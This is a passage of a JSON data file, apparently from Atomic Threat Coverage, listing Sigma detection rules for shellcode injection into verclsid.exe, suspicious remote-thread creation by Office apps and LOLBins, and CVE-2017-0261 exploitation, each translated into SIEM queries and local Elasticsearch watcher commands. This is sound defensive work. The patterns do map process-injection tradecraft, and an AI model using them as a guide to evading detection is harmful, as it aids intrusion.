GrantedAccess:\\\\\"0x1FFFFF\\\\\") AND (CallTrace.keyword:*|UNKNOWN\\\\\\\\(*VBE7.DLL* OR (SourceImage.keyword:*\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Office\\\\\\\\\\\\\\\\* AND CallTrace.keyword:*|UNKNOWN*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"10\\\\\" AND TargetImage.keyword:*\\\\\\\\\\\\\\\\verclsid.exe AND GrantedAccess:\\\\\"0x1FFFFF\\\\\") AND (CallTrace.keyword:*|UNKNOWN\\\\\\\\(*VBE7.DLL* OR (SourceImage.keyword:*\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Office\\\\\\\\\\\\\\\\* AND CallTrace.keyword:*|UNKNOWN*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Malware Shellcode in Verclsid Target Process\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"10\" AND TargetImage.keyword:*\\\\\\\\verclsid.exe AND GrantedAccess:\"0x1FFFFF\") AND (CallTrace.keyword:*|UNKNOWN\\\\(*VBE7.DLL* OR (SourceImage.keyword:*\\\\\\\\Microsoft Office\\\\\\\\* AND CallTrace.keyword:*|UNKNOWN*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"10\" TargetImage=\"*\\\\\\\\verclsid.exe\" GrantedAccess=\"0x1FFFFF\") (CallTrace=\"*|UNKNOWN(*VBE7.DLL*\" OR (SourceImage=\"*\\\\\\\\Microsoft Office\\\\\\\\*\" CallTrace=\"*|UNKNOWN*\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"10\" TargetImage=\"*\\\\\\\\verclsid.exe\" GrantedAccess=\"0x1FFFFF\") (CallTrace=\"*|UNKNOWN(*VBE7.DLL*\" OR (SourceImage=\"*\\\\\\\\Microsoft Office\\\\\\\\*\" CallTrace=\"*|UNKNOWN*\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*10)(?=.*.*\\\\verclsid\\\\.exe)(?=.*0x1FFFFF)))(?=.*(?:.*(?:.*.*\\\\|UNKNOWN\\\\(.*VBE7\\\\.DLL.*|.*(?:.*(?=.*.*\\\\Microsoft Office\\\\\\\\.*)(?=.*.*\\\\|UNKNOWN.*))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Remote Thread Created\nid: 66d31e5f-52d6-40a4-9615-002d3789a119\ndescription: Offensive tradecraft is switching away from using APIs like \"CreateRemoteThread\", however, this is still largely observed in the wild. This rule aims\n    to detect suspicious processes (those we would not expect to behave in this way like word.exe or outlook.exe) creating remote threads on other processes. It is\n    a generalistic rule, but it should have a low FP ratio due to the selected range of processes.\nnotes:\n    - MonitoringHost.exe is a process that loads .NET CLR by default and thus a favorite for process injection for .NET in-memory offensive tools.\nstatus: experimental\ndate: 27/10/2019\nmodified: 2019/11/13\nauthor: Perez Diego (@darkquassar), oscd.community\nreferences:\n    - Personal research, statistical analysis\n    - https://lolbas-project.github.io\nlogsource:\n    product: windows\n    service: sysmon\ntags:\n    - attack.privilege_escalation\n    - attack.t1055\ndetection:\n    selection: \n        EventID: 8\n        SourceImage|endswith:\n            - '\\msbuild.exe'\n            - '\\powershell.exe'\n            - '\\word.exe'\n            - '\\excel.exe'\n            - '\\powerpnt.exe'\n            - '\\outlook.exe'\n            - '\\mspaint.exe'\n            - '\\winscp.exe'\n            - '\\w3wp.exe*'       \n            - '\\ping.exe'\n            - '\\taskhost.exe'\n            - '\\monitoringhost.exe'\n            - '\\wmic.exe'\n            - '\\find.exe'\n            - '\\findstr.exe'\n            - '\\smartscreen.exe'\n            - '\\gpupdate.exe'\n            - '\\iexplore.exe'\n            - '\\explorer.exe'\n            - '\\sapcimc.exe'\n            - '\\msiexec.exe'\n            - '\\git.exe'\n            - '\\vssvc.exe'\n            - '\\vssadmin.exe'\n            - '\\lync.exe'\n            - '\\python.exe'\n            - '\\provtool.exe'\n            - '\\robocopy.exe'\n            - '\\userinit.exe'\n            - '\\runonce.exe'\n            - '\\winlogon.exe'\n            - '\\defrag.exe'\n            - '\\bash.exe'\n            - '\\spoolsv.exe'\n            - '\\cvtres.exe'\n            - '\\esentutl.exe'\n            - '\\wscript.exe'\n            - '\\expand.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\installutil.exe'\n            - '\\makecab.exe'\n            - '\\mshta.exe'\n            - '\\regsvr32.exe'\n            - '\\schtasks.exe'\n            - '\\dnx.exe'\n            - '\\mDNSResponder.exe'\n            - '\\tstheme.exe'\n    filter:\n        SourceImage|contains: 'Visual Studio'\n    condition: selection AND NOT filter\nlevel: high\nfalsepositives:\n    - Unknown", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Remote Thread Created\nid: 66d31e5f-52d6-40a4-9615-002d3789a119\ndescription: Offensive tradecraft is switching away from using APIs like \"CreateRemoteThread\", however, this is still largely observed in the wild. This rule aims\n    to detect suspicious processes (those we would not expect to behave in this way like word.exe or outlook.exe) creating remote threads on other processes. It is\n    a generalistic rule, but it should have a low FP ratio due to the selected range of processes.\nnotes:\n    - MonitoringHost.exe is a process that loads .NET CLR by default and thus a favorite for process injection for .NET in-memory offensive tools.\nstatus: experimental\ndate: 27/10/2019\nmodified: 2019/11/13\nauthor: Perez Diego (@darkquassar), oscd.community\nreferences:\n    - Personal research, statistical analysis\n    - https://lolbas-project.github.io\nlogsource:\n    product: windows\n    service: sysmon\ntags:\n    - attack.privilege_escalation\n    - attack.t1055\ndetection:\n    selection: \n        EventID: 8\n        SourceImage|endswith:\n            - '\\msbuild.exe'\n            - '\\powershell.exe'\n            - '\\word.exe'\n            - '\\excel.exe'\n            - '\\powerpnt.exe'\n            - '\\outlook.exe'\n            - '\\mspaint.exe'\n            - '\\winscp.exe'\n            - '\\w3wp.exe*'       \n            - '\\ping.exe'\n            - '\\taskhost.exe'\n            - '\\monitoringhost.exe'\n            - '\\wmic.exe'\n            - '\\find.exe'\n            - '\\findstr.exe'\n            - '\\smartscreen.exe'\n            - '\\gpupdate.exe'\n            - '\\iexplore.exe'\n            - '\\explorer.exe'\n            - '\\sapcimc.exe'\n            - '\\msiexec.exe'\n            - '\\git.exe'\n            - '\\vssvc.exe'\n            - '\\vssadmin.exe'\n            - '\\lync.exe'\n            - '\\python.exe'\n            - '\\provtool.exe'\n            - '\\robocopy.exe'\n            - '\\userinit.exe'\n            - '\\runonce.exe'\n            - '\\winlogon.exe'\n            - '\\defrag.exe'\n            - '\\bash.exe'\n            - '\\spoolsv.exe'\n            - '\\cvtres.exe'\n            - '\\esentutl.exe'\n            - '\\wscript.exe'\n            - '\\expand.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\installutil.exe'\n            - '\\makecab.exe'\n            - '\\mshta.exe'\n            - '\\regsvr32.exe'\n            - '\\schtasks.exe'\n            - '\\dnx.exe'\n            - '\\mDNSResponder.exe'\n            - '\\tstheme.exe'\n    filter:\n        SourceImage|contains: 'Visual Studio'\n    condition: selection AND NOT filter\nlevel: high\nfalsepositives:\n    - Unknown", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"8\" AND SourceImage.keyword:(*\\\\\\\\msbuild.exe OR *\\\\\\\\powershell.exe OR *\\\\\\\\word.exe OR *\\\\\\\\excel.exe OR *\\\\\\\\powerpnt.exe OR *\\\\\\\\outlook.exe OR *\\\\\\\\mspaint.exe OR *\\\\\\\\winscp.exe OR *\\\\\\\\w3wp.exe* OR *\\\\\\\\ping.exe OR *\\\\\\\\taskhost.exe OR *\\\\\\\\monitoringhost.exe OR *\\\\\\\\wmic.exe OR *\\\\\\\\find.exe OR *\\\\\\\\findstr.exe OR *\\\\\\\\smartscreen.exe OR *\\\\\\\\gpupdate.exe OR *\\\\\\\\iexplore.exe OR *\\\\\\\\explorer.exe OR *\\\\\\\\sapcimc.exe OR *\\\\\\\\msiexec.exe OR *\\\\\\\\git.exe OR *\\\\\\\\vssvc.exe OR *\\\\\\\\vssadmin.exe OR *\\\\\\\\lync.exe OR *\\\\\\\\python.exe OR *\\\\\\\\provtool.exe OR *\\\\\\\\robocopy.exe OR *\\\\\\\\userinit.exe OR *\\\\\\\\runonce.exe OR *\\\\\\\\winlogon.exe OR *\\\\\\\\defrag.exe OR *\\\\\\\\bash.exe OR *\\\\\\\\spoolsv.exe OR *\\\\\\\\cvtres.exe OR *\\\\\\\\esentutl.exe OR *\\\\\\\\wscript.exe OR *\\\\\\\\expand.exe OR *\\\\\\\\forfiles.exe OR *\\\\\\\\hh.exe OR *\\\\\\\\installutil.exe OR *\\\\\\\\makecab.exe OR *\\\\\\\\mshta.exe OR *\\\\\\\\regsvr32.exe OR *\\\\\\\\schtasks.exe OR *\\\\\\\\dnx.exe OR *\\\\\\\\mDNSResponder.exe OR *\\\\\\\\tstheme.exe)) AND (NOT (SourceImage.keyword:*Visual\\\\ Studio*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Remote-Thread-Created <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Remote Thread Created\",\\n    \"description\": \"Offensive tradecraft is switching away from using APIs like \\\\\"CreateRemoteThread\\\\\", however, this is still largely observed in the wild. This rule aims to detect suspicious processes (those we would not expect to behave in this way like word.exe or outlook.exe) creating remote threads on other processes. It is a generalistic rule, but it should have a low FP ratio due to the selected range of processes.\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.t1055\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"8\\\\\" AND SourceImage.keyword:(*\\\\\\\\\\\\\\\\msbuild.exe OR *\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\word.exe OR *\\\\\\\\\\\\\\\\excel.exe OR *\\\\\\\\\\\\\\\\powerpnt.exe OR *\\\\\\\\\\\\\\\\outlook.exe OR *\\\\\\\\\\\\\\\\mspaint.exe OR *\\\\\\\\\\\\\\\\winscp.exe OR *\\\\\\\\\\\\\\\\w3wp.exe* OR *\\\\\\\\\\\\\\\\ping.exe OR *\\\\\\\\\\\\\\\\taskhost.exe OR *\\\\\\\\\\\\\\\\monitoringhost.exe OR *\\\\\\\\\\\\\\\\wmic.exe OR *\\\\\\\\\\\\\\\\find.exe OR *\\\\\\\\\\\\\\\\findstr.exe OR *\\\\\\\\\\\\\\\\smartscreen.exe OR *\\\\\\\\\\\\\\\\gpupdate.exe OR *\\\\\\\\\\\\\\\\iexplore.exe OR *\\\\\\\\\\\\\\\\explorer.exe OR *\\\\\\\\\\\\\\\\sapcimc.exe OR *\\\\\\\\\\\\\\\\msiexec.exe OR *\\\\\\\\\\\\\\\\git.exe OR *\\\\\\\\\\\\\\\\vssvc.exe OR *\\\\\\\\\\\\\\\\vssadmin.exe OR *\\\\\\\\\\\\\\\\lync.exe OR *\\\\\\\\\\\\\\\\python.exe OR *\\\\\\\\\\\\\\\\provtool.exe OR *\\\\\\\\\\\\\\\\robocopy.exe OR *\\\\\\\\\\\\\\\\userinit.exe OR *\\\\\\\\\\\\\\\\runonce.exe OR *\\\\\\\\\\\\\\\\winlogon.exe OR *\\\\\\\\\\\\\\\\defrag.exe OR *\\\\\\\\\\\\\\\\bash.exe OR *\\\\\\\\\\\\\\\\spoolsv.exe OR *\\\\\\\\\\\\\\\\cvtres.exe OR *\\\\\\\\\\\\\\\\esentutl.exe OR *\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\expand.exe OR *\\\\\\\\\\\\\\\\forfiles.exe OR *\\\\\\\\\\\\\\\\hh.exe OR *\\\\\\\\\\\\\\\\installutil.exe OR *\\\\\\\\\\\\\\\\makecab.exe OR *\\\\\\\\\\\\\\\\mshta.exe OR *\\\\\\\\\\\\\\\\regsvr32.exe OR *\\\\\\\\\\\\\\\\schtasks.exe OR *\\\\\\\\\\\\\\\\dnx.exe OR *\\\\\\\\\\\\\\\\mDNSResponder.exe OR *\\\\\\\\\\\\\\\\tstheme.exe)) AND (NOT (SourceImage.keyword:*Visual\\\\\\\\ Studio*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"8\\\\\" AND SourceImage.keyword:(*\\\\\\\\\\\\\\\\msbuild.exe OR *\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\word.exe OR *\\\\\\\\\\\\\\\\excel.exe OR *\\\\\\\\\\\\\\\\powerpnt.exe OR *\\\\\\\\\\\\\\\\outlook.exe OR *\\\\\\\\\\\\\\\\mspaint.exe OR *\\\\\\\\\\\\\\\\winscp.exe OR *\\\\\\\\\\\\\\\\w3wp.exe* OR *\\\\\\\\\\\\\\\\ping.exe OR *\\\\\\\\\\\\\\\\taskhost.exe OR *\\\\\\\\\\\\\\\\monitoringhost.exe OR *\\\\\\\\\\\\\\\\wmic.exe OR *\\\\\\\\\\\\\\\\find.exe OR *\\\\\\\\\\\\\\\\findstr.exe OR *\\\\\\\\\\\\\\\\smartscreen.exe OR *\\\\\\\\\\\\\\\\gpupdate.exe OR *\\\\\\\\\\\\\\\\iexplore.exe OR *\\\\\\\\\\\\\\\\explorer.exe OR *\\\\\\\\\\\\\\\\sapcimc.exe OR *\\\\\\\\\\\\\\\\msiexec.exe OR *\\\\\\\\\\\\\\\\git.exe OR *\\\\\\\\\\\\\\\\vssvc.exe OR *\\\\\\\\\\\\\\\\vssadmin.exe OR *\\\\\\\\\\\\\\\\lync.exe OR *\\\\\\\\\\\\\\\\python.exe OR *\\\\\\\\\\\\\\\\provtool.exe OR *\\\\\\\\\\\\\\\\robocopy.exe OR *\\\\\\\\\\\\\\\\userinit.exe OR *\\\\\\\\\\\\\\\\runonce.exe OR *\\\\\\\\\\\\\\\\winlogon.exe OR *\\\\\\\\\\\\\\\\defrag.exe OR *\\\\\\\\\\\\\\\\bash.exe OR *\\\\\\\\\\\\\\\\spoolsv.exe OR *\\\\\\\\\\\\\\\\cvtres.exe OR *\\\\\\\\\\\\\\\\esentutl.exe OR *\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\expand.exe OR *\\\\\\\\\\\\\\\\forfiles.exe OR *\\\\\\\\\\\\\\\\hh.exe OR *\\\\\\\\\\\\\\\\installutil.exe OR *\\\\\\\\\\\\\\\\makecab.exe OR *\\\\\\\\\\\\\\\\mshta.exe OR *\\\\\\\\\\\\\\\\regsvr32.exe OR *\\\\\\\\\\\\\\\\schtasks.exe OR *\\\\\\\\\\\\\\\\dnx.exe OR *\\\\\\\\\\\\\\\\mDNSResponder.exe OR *\\\\\\\\\\\\\\\\tstheme.exe)) AND (NOT (SourceImage.keyword:*Visual\\\\\\\\ Studio*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Remote Thread Created\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"8\" AND SourceImage.keyword:(*\\\\\\\\msbuild.exe *\\\\\\\\powershell.exe *\\\\\\\\word.exe *\\\\\\\\excel.exe *\\\\\\\\powerpnt.exe *\\\\\\\\outlook.exe *\\\\\\\\mspaint.exe *\\\\\\\\winscp.exe *\\\\\\\\w3wp.exe* *\\\\\\\\ping.exe *\\\\\\\\taskhost.exe *\\\\\\\\monitoringhost.exe *\\\\\\\\wmic.exe *\\\\\\\\find.exe *\\\\\\\\findstr.exe *\\\\\\\\smartscreen.exe *\\\\\\\\gpupdate.exe *\\\\\\\\iexplore.exe *\\\\\\\\explorer.exe *\\\\\\\\sapcimc.exe *\\\\\\\\msiexec.exe *\\\\\\\\git.exe *\\\\\\\\vssvc.exe *\\\\\\\\vssadmin.exe *\\\\\\\\lync.exe *\\\\\\\\python.exe *\\\\\\\\provtool.exe *\\\\\\\\robocopy.exe *\\\\\\\\userinit.exe *\\\\\\\\runonce.exe *\\\\\\\\winlogon.exe *\\\\\\\\defrag.exe *\\\\\\\\bash.exe *\\\\\\\\spoolsv.exe *\\\\\\\\cvtres.exe *\\\\\\\\esentutl.exe *\\\\\\\\wscript.exe *\\\\\\\\expand.exe *\\\\\\\\forfiles.exe *\\\\\\\\hh.exe *\\\\\\\\installutil.exe *\\\\\\\\makecab.exe *\\\\\\\\mshta.exe *\\\\\\\\regsvr32.exe *\\\\\\\\schtasks.exe *\\\\\\\\dnx.exe *\\\\\\\\mDNSResponder.exe *\\\\\\\\tstheme.exe)) AND (NOT (SourceImage.keyword:*Visual Studio*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"8\" (SourceImage=\"*\\\\\\\\msbuild.exe\" OR SourceImage=\"*\\\\\\\\powershell.exe\" OR SourceImage=\"*\\\\\\\\word.exe\" OR SourceImage=\"*\\\\\\\\excel.exe\" OR SourceImage=\"*\\\\\\\\powerpnt.exe\" OR SourceImage=\"*\\\\\\\\outlook.exe\" OR SourceImage=\"*\\\\\\\\mspaint.exe\" OR SourceImage=\"*\\\\\\\\winscp.exe\" OR SourceImage=\"*\\\\\\\\w3wp.exe*\" OR SourceImage=\"*\\\\\\\\ping.exe\" OR SourceImage=\"*\\\\\\\\taskhost.exe\" OR SourceImage=\"*\\\\\\\\monitoringhost.exe\" OR SourceImage=\"*\\\\\\\\wmic.exe\" OR SourceImage=\"*\\\\\\\\find.exe\" OR SourceImage=\"*\\\\\\\\findstr.exe\" OR SourceImage=\"*\\\\\\\\smartscreen.exe\" OR SourceImage=\"*\\\\\\\\gpupdate.exe\" OR SourceImage=\"*\\\\\\\\iexplore.exe\" OR SourceImage=\"*\\\\\\\\explorer.exe\" OR SourceImage=\"*\\\\\\\\sapcimc.exe\" OR SourceImage=\"*\\\\\\\\msiexec.exe\" OR SourceImage=\"*\\\\\\\\git.exe\" OR SourceImage=\"*\\\\\\\\vssvc.exe\" OR SourceImage=\"*\\\\\\\\vssadmin.exe\" OR SourceImage=\"*\\\\\\\\lync.exe\" OR SourceImage=\"*\\\\\\\\python.exe\" OR SourceImage=\"*\\\\\\\\provtool.exe\" OR SourceImage=\"*\\\\\\\\robocopy.exe\" OR SourceImage=\"*\\\\\\\\userinit.exe\" OR SourceImage=\"*\\\\\\\\runonce.exe\" OR SourceImage=\"*\\\\\\\\winlogon.exe\" OR SourceImage=\"*\\\\\\\\defrag.exe\" OR SourceImage=\"*\\\\\\\\bash.exe\" OR SourceImage=\"*\\\\\\\\spoolsv.exe\" OR SourceImage=\"*\\\\\\\\cvtres.exe\" OR SourceImage=\"*\\\\\\\\esentutl.exe\" OR SourceImage=\"*\\\\\\\\wscript.exe\" OR SourceImage=\"*\\\\\\\\expand.exe\" OR SourceImage=\"*\\\\\\\\forfiles.exe\" OR SourceImage=\"*\\\\\\\\hh.exe\" OR SourceImage=\"*\\\\\\\\installutil.exe\" OR SourceImage=\"*\\\\\\\\makecab.exe\" OR SourceImage=\"*\\\\\\\\mshta.exe\" OR SourceImage=\"*\\\\\\\\regsvr32.exe\" OR SourceImage=\"*\\\\\\\\schtasks.exe\" OR SourceImage=\"*\\\\\\\\dnx.exe\" OR SourceImage=\"*\\\\\\\\mDNSResponder.exe\" OR SourceImage=\"*\\\\\\\\tstheme.exe\")) NOT (SourceImage=\"*Visual Studio*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"8\" SourceImage IN [\"*\\\\\\\\msbuild.exe\", \"*\\\\\\\\powershell.exe\", \"*\\\\\\\\word.exe\", \"*\\\\\\\\excel.exe\", \"*\\\\\\\\powerpnt.exe\", \"*\\\\\\\\outlook.exe\", \"*\\\\\\\\mspaint.exe\", \"*\\\\\\\\winscp.exe\", \"*\\\\\\\\w3wp.exe*\", \"*\\\\\\\\ping.exe\", \"*\\\\\\\\taskhost.exe\", \"*\\\\\\\\monitoringhost.exe\", \"*\\\\\\\\wmic.exe\", \"*\\\\\\\\find.exe\", \"*\\\\\\\\findstr.exe\", \"*\\\\\\\\smartscreen.exe\", \"*\\\\\\\\gpupdate.exe\", \"*\\\\\\\\iexplore.exe\", \"*\\\\\\\\explorer.exe\", \"*\\\\\\\\sapcimc.exe\", \"*\\\\\\\\msiexec.exe\", \"*\\\\\\\\git.exe\", \"*\\\\\\\\vssvc.exe\", \"*\\\\\\\\vssadmin.exe\", \"*\\\\\\\\lync.exe\", \"*\\\\\\\\python.exe\", \"*\\\\\\\\provtool.exe\", \"*\\\\\\\\robocopy.exe\", \"*\\\\\\\\userinit.exe\", \"*\\\\\\\\runonce.exe\", \"*\\\\\\\\winlogon.exe\", \"*\\\\\\\\defrag.exe\", \"*\\\\\\\\bash.exe\", \"*\\\\\\\\spoolsv.exe\", \"*\\\\\\\\cvtres.exe\", \"*\\\\\\\\esentutl.exe\", \"*\\\\\\\\wscript.exe\", \"*\\\\\\\\expand.exe\", \"*\\\\\\\\forfiles.exe\", \"*\\\\\\\\hh.exe\", \"*\\\\\\\\installutil.exe\", \"*\\\\\\\\makecab.exe\", \"*\\\\\\\\mshta.exe\", \"*\\\\\\\\regsvr32.exe\", \"*\\\\\\\\schtasks.exe\", \"*\\\\\\\\dnx.exe\", \"*\\\\\\\\mDNSResponder.exe\", \"*\\\\\\\\tstheme.exe\"])  -(SourceImage=\"*Visual Studio*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*8)(?=.*(?:.*.*\\\\msbuild\\\\.exe|.*.*\\\\powershell\\\\.exe|.*.*\\\\word\\\\.exe|.*.*\\\\excel\\\\.exe|.*.*\\\\powerpnt\\\\.exe|.*.*\\\\outlook\\\\.exe|.*.*\\\\mspaint\\\\.exe|.*.*\\\\winscp\\\\.exe|.*.*\\\\w3wp\\\\.exe.*|.*.*\\\\ping\\\\.exe|.*.*\\\\taskhost\\\\.exe|.*.*\\\\monitoringhost\\\\.exe|.*.*\\\\wmic\\\\.exe|.*.*\\\\find\\\\.exe|.*.*\\\\findstr\\\\.exe|.*.*\\\\smartscreen\\\\.exe|.*.*\\\\gpupdate\\\\.exe|.*.*\\\\iexplore\\\\.exe|.*.*\\\\explorer\\\\.exe|.*.*\\\\sapcimc\\\\.exe|.*.*\\\\msiexec\\\\.exe|.*.*\\\\git\\\\.exe|.*.*\\\\vssvc\\\\.exe|.*.*\\\\vssadmin\\\\.exe|.*.*\\\\lync\\\\.exe|.*.*\\\\python\\\\.exe|.*.*\\\\provtool\\\\.exe|.*.*\\\\robocopy\\\\.exe|.*.*\\\\userinit\\\\.exe|.*.*\\\\runonce\\\\.exe|.*.*\\\\winlogon\\\\.exe|.*.*\\\\defrag\\\\.exe|.*.*\\\\bash\\\\.exe|.*.*\\\\spoolsv\\\\.exe|.*.*\\\\cvtres\\\\.exe|.*.*\\\\esentutl\\\\.exe|.*.*\\\\wscript\\\\.exe|.*.*\\\\expand\\\\.exe|.*.*\\\\forfiles\\\\.exe|.*.*\\\\hh\\\\.exe|.*.*\\\\installutil\\\\.exe|.*.*\\\\makecab\\\\.exe|.*.*\\\\mshta\\\\.exe|.*.*\\\\regsvr32\\\\.exe|.*.*\\\\schtasks\\\\.exe|.*.*\\\\dnx\\\\.exe|.*.*\\\\mDNSResponder\\\\.exe|.*.*\\\\tstheme\\\\.exe))))(?=.*(?!.*(?:.*(?=.*.*Visual Studio.*)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Exploit for CVE-2017-0261\nid: 864403a1-36c9-40a2-a982-4c9a45f7d833\nstatus: experimental\ndescription: Detects Winword starting uncommon sub process FLTLDR.exe as used in exploits for CVE-2017-0261 and CVE-2017-0262\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2017/05/eps-processing-zero-days.html\nauthor: Florian Roth\ndate: 2018/02/22\ntags:\n  - attack.defense_evasion\n  - attack.privilege_escalation\n  - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\WINWORD.EXE'\n        Image: '*\\FLTLDR.exe*'\n    condition: selection\nfalsepositives:\n    - Several false positives identified, check for suspicious file names or locations (e.g. Temp folders)\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Exploit for CVE-2017-0261\nid: 864403a1-36c9-40a2-a982-4c9a45f7d833\nstatus: experimental\ndescription: Detects Winword starting uncommon sub process FLTLDR.exe as used in exploits for CVE-2017-0261 and CVE-2017-0262\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2017/05/eps-processing-zero-days.html\nauthor: Florian Roth\ndate: 2018/02/22\ntags:\n  - attack.defense_evasion\n  - attack.privilege_escalation\n  - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage: '*\\WINWORD.EXE'\n        Image: '*\\FLTLDR.exe*'\n    condition: selection\nfalsepositives:\n    - Several false positives identified, check for suspicious file names or locations (e.g. Temp folders)\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:*\\\\\\\\WINWORD.EXE AND Image.keyword:*\\\\\\\\FLTLDR.exe*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Exploit-for-CVE-2017-0261 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Exploit for CVE-2017-0261\",\\n    \"description\": \"Detects Winword starting uncommon sub process FLTLDR.exe as used in exploits for CVE-2017-0261 and CVE-2017-0262\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1055\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\WINWORD.EXE AND Image.keyword:*\\\\\\\\\\\\\\\\FLTLDR.exe*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:*\\\\\\\\\\\\\\\\WINWORD.EXE AND Image.keyword:*\\\\\\\\\\\\\\\\FLTLDR.exe*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Exploit for CVE-2017-0261\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": 